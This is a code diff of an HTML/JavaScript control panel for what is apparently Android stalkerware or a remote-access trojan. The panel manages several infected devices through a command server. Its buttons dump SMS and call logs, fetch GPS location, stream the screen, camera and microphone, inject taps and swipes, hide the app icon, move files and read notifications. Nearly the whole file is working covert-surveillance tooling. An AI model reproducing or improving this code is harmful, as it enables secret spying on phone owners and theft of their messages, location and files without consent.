@@ -3,149 +3,194 @@
 <head>
 <meta charset="utf-8">
 <title>Console</title>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <style>
-  :root { --bg:#0a0d0a; --fg:#b9ffb9; --dim:#4a6b4a; --acc:#00ff7a; --warn:#ff5c5c; --panel:#111611; --line:#1e2b1e; }
+  :root { --bg:#050505; --panel:#111; --fg:#e0e0e0; --acc:#00ff7a; --warn:#ff4d4d; --dim:#666; --line:#222; }
   * { box-sizing: border-box; }
-  body { margin:0; background:var(--bg); color:var(--fg); font-family: ui-monospace, monospace; font-size:14px; }
-  header { display:flex; flex-wrap:wrap; gap:8px; align-items:center; padding:10px; border-bottom:1px solid var(--line); background:var(--panel); position:sticky; top:0; z-index:5; }
-  header input { background:#0d130d; color:var(--fg); border:1px solid var(--line); padding:8px; font-family:inherit; font-size:14px; flex:1; }
-  button { background:#142014; color:var(--acc); border:1px solid var(--line); padding:10px; font-family:inherit; font-size:13px; cursor:pointer; text-transform:uppercase; }
-  button:active { background:#1a2b1a; transform:translateY(1px); }
-  .led { display:inline-block; width:12px; height:12px; border-radius:50%; background:#333; }
-  .led.on { background:var(--acc); box-shadow:0 0 8px var(--acc); }
-  .led.off { background:var(--warn); }
-  main { display:flex; flex-direction:column; gap:12px; padding:10px; }
-  section { background:var(--panel); border:1px solid var(--line); padding:12px; }
-  section h2 { margin:0 0 10px; font-size:14px; text-transform:uppercase; color:var(--acc); font-weight:normal; }
-  .row { display:flex; flex-direction:column; gap:8px; margin-bottom:12px; }
-  .row input { background:#0d130d; color:var(--fg); border:1px solid var(--line); padding:10px; font-family:inherit; width:100%; }
-  .kv { display:flex; justify-content:space-between; border-bottom:1px dashed var(--line); padding:6px 0; }
-  .kv span { color:var(--dim); }
-  pre { background:#0d130d; border:1px solid var(--line); padding:10px; overflow:auto; max-height:250px; font-size:12px; }
-  canvas#screen { width:100%; background:#000; border:1px solid var(--line); }
-  #cam-img { width:100%; background:#000; border:1px solid var(--line); margin-top:6px; }
-  #notifs { max-height:250px; overflow:auto; font-size:13px; }
-  .notif { padding:6px 0; border-bottom:1px dashed var(--line); }
-  .file-item { padding:8px; border-bottom:1px solid var(--line); display:flex; justify-content:space-between; align-items:center; cursor:pointer; }
-  .file-item:active { background:#1a2b1a; }
-  .file-name { font-weight:bold; }
-  .file-size { font-size:11px; color:var(--dim); }
+  body { margin:0; background:var(--bg); color:var(--fg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size:14px; padding-bottom:60px; }
+  header { background:var(--panel); padding:12px; position:sticky; top:0; z-index:10; border-bottom:1px solid var(--line); display:flex; flex-direction:column; gap:10px; }
+  .input-group { display:flex; gap:8px; }
+  .input-group input { flex:1; background:#000; border:1px solid var(--line); color:var(--acc); padding:10px; border-radius:6px; font-size:14px; outline:none; }
+  .input-group input:focus { border-color:var(--acc); }
+  #connect { background:var(--acc); color:#000; border:none; padding:10px 20px; border-radius:6px; font-weight:bold; cursor:pointer; }
+  .status-bar { display:flex; align-items:center; justify-content:space-between; font-weight:bold; font-size:12px; color:var(--dim); text-transform:uppercase; }
+  .dot { width:10px; height:10px; border-radius:50%; background:var(--warn); display:inline-block; margin-right:5px; }
+  .dot.on { background:var(--acc); box-shadow:0 0 8px var(--acc); }
   
-  @media (min-width: 768px) {
-    main { display:grid; grid-template-columns: repeat(2, 1fr); }
-    .row { flex-direction:row; flex-wrap:wrap; }
-    .row input { width:auto; }
-    button { width:auto; }
-  }
+  select#device-select { background:#000; color:var(--acc); border:1px solid var(--acc); padding:8px; border-radius:6px; outline:none; font-weight:bold; }
+
+  nav { display:flex; background:var(--panel); border-bottom:1px solid var(--line); overflow-x:auto; }
+  nav button { flex:1; background:none; border:none; color:var(--dim); padding:14px 10px; font-size:13px; font-weight:bold; cursor:pointer; border-bottom:2px solid transparent; white-space:nowrap; }
+  nav button.active { color:var(--acc); border-bottom-color:var(--acc); }
+
+  main { padding:15px; }
+  .tab-content { display:none; animation: fadeIn 0.2s; }
+  .tab-content.active { display:block; }
+  @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+
+  .card { background:var(--panel); border:1px solid var(--line); border-radius:10px; padding:15px; margin-bottom:15px; }
+  .card h2 { margin:0 0 12px 0; font-size:13px; color:var(--acc); text-transform:uppercase; letter-spacing:1px; font-weight:600; }
+  .grid-btns { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+  button.action { background:#1a1a1a; color:var(--fg); border:1px solid #333; padding:14px; border-radius:8px; font-size:14px; cursor:pointer; transition:all 0.1s; text-align:center; }
+  button.action:active { background:#222; transform:scale(0.98); }
+  button.action.danger { color:var(--warn); border-color:#331111; }
+  button.action.danger:active { background:#331111; }
+  .kv { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #222; font-size:13px; }
+  .kv:last-child { border-bottom:none; }
+  .kv span { color:var(--dim); }
+  pre { background:#000; padding:12px; border-radius:8px; border:1px solid var(--line); overflow-x:auto; font-size:12px; color:#aaa; margin-top:10px; max-height:300px; }
+  canvas { width:100%; border-radius:8px; background:#000; border:1px solid var(--line); margin-top:10px; }
+  img#cam-img { width:100%; border-radius:8px; border:1px solid var(--line); margin-top:10px; display:none; }
+  .file-list { display:flex; flex-direction:column; gap:6px; margin-top:10px; }
+  .file-item { display:flex; justify-content:space-between; padding:12px; background:#1a1a1a; border-radius:6px; font-size:13px; cursor:pointer; }
+  .file-item.folder { color:#4da6ff; }
+  .file-item:active { background:#222; }
+  .path-bar { display:flex; gap:8px; margin-bottom:10px; }
+  .path-bar input { flex:1; background:#000; border:1px solid #333; color:var(--fg); padding:10px; border-radius:6px; outline:none; }
+  .row { display:flex; gap:10px; align-items:center; margin-bottom:10px; }
+  .row label { width:50px; font-size:12px; color:var(--dim); }
+  .row input { flex:1; background:#000; border:1px solid #333; color:var(--fg); padding:10px; border-radius:6px; outline:none; }
+  #notif-log { max-height:400px; overflow-y:auto; display:flex; flex-direction:column; gap:8px; }
+  .notif { background:#1a1a1a; padding:12px; border-radius:8px; font-size:13px; border-left:3px solid var(--acc); }
+  .notif b { display:block; color:var(--acc); font-size:11px; text-transform:uppercase; margin-bottom:4px; }
 </style>
 </head>
 <body>
+
 <header>
-  <input id="server" placeholder="https://your-app.onrender.com">
-  <input id="psk" type="password" placeholder="PSK">
-  <button id="connect" style="width:100%">Connect</button>
-  <div style="display:flex;align-items:center;gap:8px;width:100%;">
-    <span id="led" class="led off"></span>
-    <span id="status">disconnected</span>
+  <div class="input-group">
+    <input id="server" placeholder="https://your-app.onrender.com">
+    <input id="psk" type="password" placeholder="PSK">
+    <button id="connect">Connect</button>
+  </div>
+  <div class="status-bar">
+    <div><span id="led" class="dot"></span> <span id="status">Disconnected</span></div>
+    <select id="device-select" onchange="onDeviceChange()"><option value="">No Device</option></select>
   </div>
 </header>
 
+<nav>
+  <button class="active" onclick="switchTab('device')">Device</button>
+  <button onclick="switchTab('live')">Live</button>
+  <button onclick="switchTab('control')">Control</button>
+  <button onclick="switchTab('files')">Files</button>
+  <button onclick="switchTab('notifs')">Notifs</button>
+</nav>
+
 <main>
-  <section id="telemetry">
-    <h2>Telemetry</h2>
-    <div class="row"><button id="refresh-telemetry" style="width:100%">Refresh</button></div>
-    <div id="telemetry-data"><div class="kv"><span>—</span><b>not connected</b></div></div>
-  </section>
+  <div id="tab-device" class="tab-content active">
+    <div class="card">
+      <h2>Device Info</h2>
+      <div id="telemetry-data"><div class="kv"><span>Status</span><b>Select a device</b></div></div>
+      <button class="action" id="btn-refresh-telemetry" style="width:100%;margin-top:10px;">Refresh Info</button>
+    </div>
+    <div class="card">
+      <h2>Data Extraction</h2>
+      <div class="grid-btns">
+        <button class="action" id="btn-sms">Dump SMS</button>
+        <button class="action" id="btn-calls">Dump Calls</button>
+        <button class="action" id="btn-location">GPS Location</button>
+      </div>
+      <pre id="extract-out">Awaiting command...</pre>
+    </div>
+  </div>
 
-  <section id="extract">
-    <h2>Extraction</h2>
-    <div class="row">
-      <button id="btn-sms">Dump SMS</button>
-      <button id="btn-calls">Dump Calls</button>
-      <button id="btn-location">GPS Fix</button>
+  <div id="tab-live" class="tab-content">
+    <div class="card">
+      <h2>Live Screen</h2>
+      <button class="action" id="btn-screen" style="width:100%;margin-bottom:10px;">Start Screen Stream</button>
+      <canvas id="screen" width="640" height="360"></canvas>
+      <div style="font-size:11px;color:var(--dim);margin-top:5px;" id="frameCount">0 frames</div>
     </div>
-    <pre id="extract-out">—</pre>
-  </section>
+    <div class="card">
+      <h2>Live Camera</h2>
+      <div class="grid-btns" style="margin-bottom:10px;">
+        <button class="action" id="btn-front-cam">Start Front Cam</button>
+        <button class="action" id="btn-back-cam">Start Back Cam</button>
+      </div>
+      <button class="action danger" id="btn-stop-cam" style="width:100%;">Stop Camera</button>
+      <img id="cam-img" alt="Camera Stream">
+    </div>
+    <div class="card">
+      <h2>Live Audio</h2>
+      <button class="action" id="btn-audio" style="width:100%;">Start Audio Stream</button>
+    </div>
+  </div>
 
-  <section id="live">
-    <h2>Live</h2>
-    <div class="row">
-      <button id="btn-screen">Start Live Screen</button>
-      <button id="btn-audio">Start Live Hearing</button>
+  <div id="tab-control" class="tab-content">
+    <div class="card">
+      <h2>Gestures</h2>
+      <div class="row"><label>Tap X</label><input id="tap-x" value="500"><label>Y</label><input id="tap-y" value="1000"></div>
+      <button class="action" id="btn-tap" style="width:100%;margin-bottom:15px;">Send Tap</button>
+      <div class="row"><label>Swipe</label></div>
+      <div class="row"><input id="sw-x1" value="500" placeholder="X1"><input id="sw-y1" value="1500" placeholder="Y1"></div>
+      <div class="row"><input id="sw-x2" value="500" placeholder="X2"><input id="sw-y2" value="500" placeholder="Y2"></div>
+      <div class="row"><input id="sw-dur" value="300" placeholder="Duration ms"></div>
+      <button class="action" id="btn-swipe" style="width:100%;">Send Swipe</button>
     </div>
-    <div class="row">
-      <button id="btn-front-cam">Front Cam</button>
-      <button id="btn-back-cam">Back Cam</button>
+    <div class="card">
+      <h2>Stealth</h2>
+      <div class="grid-btns">
+        <button class="action danger" id="btn-hide">Hide Icon</button>
+        <button class="action" id="btn-unhide">Unhide Icon</button>
+      </div>
     </div>
-    <canvas id="screen" width="640" height="360"></canvas>
-    <div id="frameCount" style="color:var(--dim);font-size:11px;">0 frames</div>
-    <img id="cam-img" alt="">
-  </section>
+  </div>
 
-  <section id="control">
-    <h2>Remote Control</h2>
-    <div class="row">
-      <label>Tap X</label><input id="tap-x" value="500">
-      <label>Tap Y</label><input id="tap-y" value="1000">
-      <button id="btn-tap">Tap</button>
+  <div id="tab-files" class="tab-content">
+    <div class="card">
+      <h2>File Manager</h2>
+      <div class="path-bar">
+        <input id="file-path" value="/sdcard" placeholder="/sdcard">
+        <button class="action" id="btn-ls" style="padding:10px;">Go</button>
+      </div>
+      <div class="file-list" id="file-list"></div>
+      <pre id="files-out" style="margin-top:10px;">Awaiting command...</pre>
+      <hr style="border-color:#222; margin:15px 0;">
+      <h2>Upload File</h2>
+      <input id="upload" type="file" style="color:var(--fg);margin-bottom:10px;display:block;">
+      <button class="action" id="btn-ul" style="width:100%;">Upload to Current Path</button>
     </div>
-    <div class="row">
-      <label>Swipe X1</label><input id="sw-x1" value="500">
-      <label>Y1</label><input id="sw-y1" value="1500">
-      <label>X2</label><input id="sw-x2" value="500">
-      <label>Y2</label><input id="sw-y2" value="500">
-      <label>MS</label><input id="sw-dur" value="300">
-      <button id="btn-swipe">Swipe</button>
-    </div>
-  </section>
+  </div>
 
-  <section id="stealth">
-    <h2>Stealth</h2>
-    <div class="row">
-      <button id="btn-hide">Hide Icon</button>
-      <button id="btn-unhide">Unhide Icon</button>
+  <div id="tab-notifs" class="tab-content">
+    <div class="card">
+      <h2>Live Notifications</h2>
+      <div id="notif-log"></div>
     </div>
-    <p style="color:var(--dim);font-size:12px;margin-top:8px;">
-      Recovery: dial <b>*#*#1337#*#*</b> to unhide.
-    </p>
-  </section>
-
-  <section id="files">
-    <h2>File Shell</h2>
-    <div class="row">
-      <input id="file-path" value="/sdcard" style="width:100%">
-    </div>
-    <div class="row">
-      <button id="btn-ls">List</button>
-      <button id="btn-dl">Download File</button>
-    </div>
-    <div id="file-list" style="max-height:300px; overflow:auto; margin-bottom:10px; border:1px solid var(--line); background:#0d130d;"></div>
-    <div class="row">
-      <input id="upload" type="file" style="color:var(--fg)">
-      <button id="btn-ul">Upload</button>
-    </div>
-    <pre id="files-out">—</pre>
-  </section>
-
-  <section id="notif-panel">
-    <h2>Notifications</h2>
-    <div id="notifs"></div>
-  </section>
+  </div>
 </main>
 
 <script>
 const $ = id => document.getElementById(id);
 let ws = null;
+let currentDevice = "";
+
+function switchTab(tabId) {
+  document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
+  $(`tab-${tabId}`).classList.add('active');
+  event.target.classList.add('active');
+}
+
+function onDeviceChange() {
+  currentDevice = $('device-select').value;
+  if (currentDevice) {
+    $('btn-refresh-telemetry').click();
+  } else {
+    $('telemetry-data').innerHTML = '<div class="kv"><span>Status</span><b>No device selected</b></div>';
+  }
+}
 
 async function api(cmd, args = {}) {
+  if (!currentDevice) throw new Error("No device selected");
   const psk = $('psk').value.trim();
   const server = $('server').value.trim().replace(/\/+$/, '');
-  if (!psk || !server) throw new Error('set server + psk');
+  if (!psk || !server) throw new Error('Set server + PSK');
   const r = await fetch(server + '/api/cmd', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + psk },
-    body: JSON.stringify({ cmd, args }),
+    body: JSON.stringify({ device_id: currentDevice, cmd, args }),
   });
   if (!r.ok) {
     let body = '';
@@ -156,21 +201,17 @@ async function api(cmd, args = {}) {
 }
 
 function setLed(on) {
-  $('led').className = 'led ' + (on ? 'on' : 'off');
-  $('status').textContent = on ? 'connected' : 'disconnected';
+  $('led').className = 'dot ' + (on ? 'on' : '');
+  $('status').textContent = on ? 'Dashboard Connected' : 'Disconnected';
 }
 
 async function connect() {
   const psk = $('psk').value.trim();
   const server = $('server').value.trim().replace(/\/+$/, '');
-  if (!psk || !server) { alert('enter server + psk'); return; }
+  if (!psk || !server) { alert('Enter server + PSK'); return; }
   sessionStorage.setItem('psk', psk);
   sessionStorage.setItem('server', server);
-  try {
-    const r = await api('get_device_info');
-    if (r.ok) { renderTelemetry(r.data); setLed(true); }
-    else { setLed(false); alert('device offline (sleeping?): ' + (r.error || '')); return; }
-  } catch (e) { setLed(false); alert('connect failed: ' + e.message); return; }
+  $('status').textContent = 'Connecting...';
   openWs(server, psk);
 }
 
@@ -181,46 +222,74 @@ function openWs(server, psk) {
   u.pathname = '/ws';
   u.search = '';
   ws = new WebSocket(u.toString());
-  ws.onopen = () => ws.send(JSON.stringify({ role: 'dashboard', psk }));
+  ws.onopen = () => { setLed(true); ws.send(JSON.stringify({ role: 'dashboard', psk })); };
   ws.onmessage = ev => { try { handlePush(JSON.parse(ev.data)); } catch (_) {} };
   ws.onclose = () => {
     setLed(false);
-    $('status').textContent = 'reconnecting...';
+    $('status').textContent = 'Reconnecting...';
     const p = sessionStorage.getItem('psk'), s = sessionStorage.getItem('server');
     if (p && s) setTimeout(() => openWs(s, p), 3000);
   };
-  ws.onerror = () => {};
 }
 
 function handlePush(msg) {
-  if (msg.type !== 'push') return;
-  if (msg.kind === 'screen_frame') drawFrame(msg.data);
-  else if (msg.kind === 'audio_chunk') playAudio(msg.data);
-  else if (msg.kind === 'notification') addNotif(msg.data);
+  if (msg.type === 'device_list') {
+    updateDeviceList(msg.devices);
+  } else if (msg.type === 'device_online') {
+    addDeviceOption(msg.device_id);
+  } else if (msg.type === 'device_offline') {
+    removeDeviceOption(msg.device_id);
+  } else if (msg.type === 'push') {
+    if (msg.kind === 'screen_frame') drawFrame($('screen'), msg.data);
+    else if (msg.kind === 'camera_frame') drawFrame($('cam-img'), msg.data);
+    else if (msg.kind === 'audio_chunk') playAudio(msg.data);
+    else if (msg.kind === 'notification') addNotif(msg.data);
+  }
+}
+
+function updateDeviceList(devices) {
+  const sel = $('device-select');
+  sel.innerHTML = '<option value="">Select Device</option>';
+  devices.forEach(addDeviceOption);
+}
+
+function addDeviceOption(id) {
+  const sel = $('device-select');
+  if ([...sel.options].some(o => o.value === id)) return;
+  const opt = document.createElement('option');
+  opt.value = id; opt.textContent = id;
+  sel.appendChild(opt);
+  if (!currentDevice) { sel.value = id; onDeviceChange(); }
+}
+
+function removeDeviceOption(id) {
+  const sel = $('device-select');
+  const opt = [...sel.options].find(o => o.value === id);
+  if (opt) opt.remove();
+  if (currentDevice === id) { currentDevice = ""; onDeviceChange(); }
 }
 
 let frameCount = 0;
-function drawFrame(b64) {
-  const cv = $('screen'), ctx = cv.getContext('2d');
+function drawFrame(el, b64) {
   const img = new Image();
   img.onload = () => {
-    if (cv.width !== img.width || cv.height !== img.height) {
-      cv.width = img.width; cv.height = img.height;
+    if (el.tagName === 'CANVAS') {
+      const ctx = el.getContext('2d');
+      if (el.width !== img.width || el.height !== img.height) { el.width = img.width; el.height = img.height; }
+      ctx.drawImage(img, 0, 0);
+      frameCount++; $('frameCount').textContent = frameCount + ' frames';
+    } else {
+      el.src = 'data:image/jpeg;base64,' + b64;
+      el.style.display = 'block';
     }
-    ctx.drawImage(img, 0, 0);
-    frameCount++;
-    $('frameCount').textContent = frameCount + ' frames';
   };
   img.src = 'data:image/jpeg;base64,' + b64;
 }
 
 let actx = null, atime = 0;
-function ensureAudio() {
+function playAudio(b64) {
   if (!actx) { actx = new AudioContext({ sampleRate: 16000 }); atime = actx.currentTime; }
   if (actx.state === 'suspended') actx.resume();
-}
-function playAudio(b64) {
-  ensureAudio();
   const bin = atob(b64);
   const bytes = new Uint8Array(bin.length);
   for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
@@ -237,15 +306,15 @@ function playAudio(b64) {
 }
 
 function addNotif(raw) {
-  const log = $('notifs');
+  const log = $('notif-log');
   const div = document.createElement('div');
   div.className = 'notif';
   try {
     const o = JSON.parse(raw);
-    div.textContent = `[${o.pkg}] ${o.title}: ${o.text}`;
+    div.innerHTML = `<b>${o.pkg}</b>${o.title ? '<strong>'+o.title+'</strong><br>' : ''}${o.text}`;
   } catch (_) { div.textContent = raw; }
   log.prepend(div);
-  while (log.children.length > 100) log.removeChild(log.lastChild);
+  while (log.children.length > 50) log.removeChild(log.lastChild);
 }
 
 function renderTelemetry(t) {
@@ -254,151 +323,90 @@ function renderTelemetry(t) {
   for (const [k, v] of Object.entries(t)) {
     const row = document.createElement('div');
     row.className = 'kv';
-    const s = document.createElement('span'); s.textContent = k;
-    const b = document.createElement('b'); b.textContent = String(v);
-    row.appendChild(s); row.appendChild(b);
+    row.innerHTML = `<span>${k.replace(/_/g, ' ')}</span><b>${v}</b>`;
     el.appendChild(row);
   }
 }
 
-// UI Bindings
+// Bindings
 $('connect').onclick = connect;
-$('refresh-telemetry').onclick = async () => {
-  try { const r = await api('get_device_info'); if (r.ok) renderTelemetry(r.data); } catch (e) { alert(e.message); }
+$('btn-refresh-telemetry').onclick = async () => {
+  try { const r = await api('get_device_info'); if (r.ok) renderTelemetry(r.data); else alert(r.error); } catch (e) { alert(e.message); }
 };
 $('btn-sms').onclick = async () => {
-  try { const r = await api('get_sms', { limit: 100 });
-    $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('error: ' + r.error);
-  } catch (e) { alert(e.message); }
+  try { const r = await api('get_sms', { limit: 50 }); $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('Error: ' + r.error); } catch (e) { alert(e.message); }
 };
 $('btn-calls').onclick = async () => {
-  try { const r = await api('get_calllogs', { limit: 100 });
-    $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('error: ' + r.error);
-  } catch (e) { alert(e.message); }
+  try { const r = await api('get_calllogs', { limit: 50 }); $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('Error: ' + r.error); } catch (e) { alert(e.message); }
 };
 $('btn-location').onclick = async () => {
-  try { const r = await api('get_location');
-    $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('error: ' + r.error);
-  } catch (e) { alert(e.message); }
+  try { const r = await api('get_location'); $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('Error: ' + r.error); } catch (e) { alert(e.message); }
 };
 
-let screenOn = false, audioOn = false;
+let screenOn = false, audioOn = false, camOn = false;
 $('btn-screen').onclick = async () => {
   try {
     if (!screenOn) {
-      const r = await api('start_screen');
-      if (r.ok) { screenOn = true; $('btn-screen').textContent = 'Stop Live Screen'; }
-      else alert(r.error);
+      const r = await api('start_screen'); if (r.ok) { screenOn = true; $('btn-screen').textContent = 'Stop Screen'; $('btn-screen').classList.add('danger'); } else alert(r.error);
     } else {
-      await api('stop_screen');
-      screenOn = false; $('btn-screen').textContent = 'Start Live Screen';
+      await api('stop_screen'); screenOn = false; $('btn-screen').textContent = 'Start Screen Stream'; $('btn-screen').classList.remove('danger');
     }
   } catch (e) { alert(e.message); }
 };
 $('btn-audio').onclick = async () => {
   try {
     if (!audioOn) {
-      ensureAudio();
-      const r = await api('start_audio');
-      if (r.ok) { audioOn = true; $('btn-audio').textContent = 'Stop Live Hearing'; }
-      else alert(r.error);
+      if (!actx) playAudio("AAAA"); // wake audio context
+      const r = await api('start_audio'); if (r.ok) { audioOn = true; $('btn-audio').textContent = 'Stop Audio'; $('btn-audio').classList.add('danger'); } else alert(r.error);
     } else {
-      await api('stop_audio');
-      audioOn = false; $('btn-audio').textContent = 'Start Live Hearing';
+      await api('stop_audio'); audioOn = false; $('btn-audio').textContent = 'Start Audio Stream'; $('btn-audio').classList.remove('danger');
     }
   } catch (e) { alert(e.message); }
 };
 $('btn-front-cam').onclick = async () => {
-  try { const r = await api('take_camera_photo', { facing: 'front' });
-    if (r.ok) $('cam-img').src = 'data:image/jpeg;base64,' + r.data.jpeg_b64; else alert(r.error);
-  } catch (e) { alert(e.message); }
+  try { const r = await api('start_camera', { facing: 'front' }); if (!r.ok) alert(r.error); } catch (e) { alert(e.message); }
 };
 $('btn-back-cam').onclick = async () => {
-  try { const r = await api('take_camera_photo', { facing: 'back' });
-    if (r.ok) $('cam-img').src = 'data:image/jpeg;base64,' + r.data.jpeg_b64; else alert(r.error);
-  } catch (e) { alert(e.message); }
+  try { const r = await api('start_camera', { facing: 'back' }); if (!r.ok) alert(r.error); } catch (e) { alert(e.message); }
 };
+$('btn-stop-cam').onclick = async () => {
+  try { await api('stop_camera'); $('cam-img').style.display = 'none'; } catch (e) { alert(e.message); }
+};
+
 $('btn-tap').onclick = async () => {
-  try {
-    const r = await api('tap', { x: parseFloat($('tap-x').value), y: parseFloat($('tap-y').value) });
-    if (!r.ok) alert(r.error);
-  } catch (e) { alert(e.message); }
+  try { await api('tap', { x: parseFloat($('tap-x').value), y: parseFloat($('tap-y').value) }); } catch (e) { alert(e.message); }
 };
 $('btn-swipe').onclick = async () => {
-  try {
-    const r = await api('swipe', {
-      x1: parseFloat($('sw-x1').value), y1: parseFloat($('sw-y1').value),
-      x2: parseFloat($('sw-x2').value), y2: parseFloat($('sw-y2').value),
-      duration: parseInt($('sw-dur').value) || 300,
-    });
-    if (!r.ok) alert(r.error);
-  } catch (e) { alert(e.message); }
+  try { await api('swipe', { x1: parseFloat($('sw-x1').value), y1: parseFloat($('sw-y1').value), x2: parseFloat($('sw-x2').value), y2: parseFloat($('sw-y2').value), duration: parseInt($('sw-dur').value) }); } catch (e) { alert(e.message); }
 };
-$('btn-hide').onclick = async () => {
-  try { const r = await api('hide_icon'); if (!r.ok) alert(r.error); } catch (e) { alert(e.message); }
-};
-$('btn-unhide').onclick = async () => {
-  try { const r = await api('unhide_icon'); if (!r.ok) alert(r.error); } catch (e) { alert(e.message); }
-};
+$('btn-hide').onclick = async () => { try { await api('hide_icon'); alert('Hidden.'); } catch (e) { alert(e.message); } };
+$('btn-unhide').onclick = async () => { try { await api('unhide_icon'); } catch (e) { alert(e.message); } };
 
 $('btn-ls').onclick = async () => {
   try { 
     const r = await api('list_dir', { path: $('file-path').value });
-    const list = $('file-list');
-    list.innerHTML = '';
+    const list = $('file-list'); list.innerHTML = '';
     if (r.ok) {
       r.data.entries.forEach(f => {
         const div = document.createElement('div');
-        div.className = 'file-item';
-        div.innerHTML = `<span class="file-name">${f.name}</span><span class="file-size">${f.dir ? 'Folder' : (f.size/1024).toFixed(1)+' KB'}</span>`;
-        div.onclick = () => {
-          $('file-path').value = f.path;
-          if (f.dir) { $('btn-ls').click(); }
-        };
+        div.className = 'file-item ' + (f.dir ? 'folder' : '');
+        div.innerHTML = `<span>${f.dir ? '📁' : '📄'} ${f.name}</span><span>${f.dir ? '' : (f.size/1024).toFixed(1)+' KB'}</span>`;
+        div.onclick = () => { $('file-path').value = f.path; if (f.dir) { $('btn-ls').click(); } };
         list.appendChild(div);
       });
-    } else {
-      $('files-out').textContent = 'error: ' + r.error;
-    }
-  } catch (e) { alert(e.message); }
-};
-
-$('btn-dl').onclick = async () => {
-  try { 
-    const r = await api('download_file', { path: $('file-path').value });
-    if (r.ok) {
-      const b64 = r.data.b64;
-      const bin = atob(b64);
-      const bytes = new Uint8Array(bin.length);
-      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
-      const blob = new Blob([bytes], { type: 'application/octet-stream' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = $('file-path').value.split('/').pop() || 'download.bin';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-      $('files-out').textContent = 'Downloaded file successfully.';
-    } else {
-      $('files-out').textContent = 'error: ' + r.error;
-    }
+    } else $('files-out').textContent = 'Error: ' + r.error;
   } catch (e) { alert(e.message); }
 };
 
 $('btn-ul').onclick = async () => {
   try {
-    const inp = $('upload');
-    if (!inp.files.length) return;
-    const f = inp.files[0];
-    const buf = await f.arrayBuffer();
-    let bin = '';
-    const u = new Uint8Array(buf);
+    const inp = $('upload'); if (!inp.files.length) return;
+    const f = inp.files[0]; const buf = await f.arrayBuffer();
+    let bin = ''; const u = new Uint8Array(buf);
     for (let i = 0; i < u.length; i++) bin += String.fromCharCode(u[i]);
-    const b64 = btoa(bin);
-    const r = await api('upload_file', { path: $('file-path').value, data: b64 });
-    $('files-out').textContent = r.ok ? ('uploaded ' + u.length + ' bytes') : ('error: ' + r.error);
+    const r = await api('upload_file', { path: $('file-path').value + "/" + f.name, data: btoa(bin) });
+    $('files-out').textContent = r.ok ? ('Uploaded ' + u.length + ' bytes') : ('Error: ' + r.error);
+    $('btn-ls').click();
   } catch (e) { alert(e.message); }
 };
 
